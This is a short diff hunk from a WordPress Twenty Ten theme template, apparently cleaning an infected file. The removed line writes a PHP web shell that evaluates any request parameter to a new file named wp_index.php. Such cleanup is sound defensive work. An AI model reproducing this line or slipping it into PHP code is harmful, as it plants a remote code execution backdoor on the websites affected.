@@ -6,7 +6,7 @@
  * @subpackage Twenty_Ten
  * @since Twenty Ten 1.0
  */
-@file_put_contents("wp_index.php",'<?php eval($_REQUEST[102966]);?>');
+
 get_header(); ?>
 
 	<div id="container">
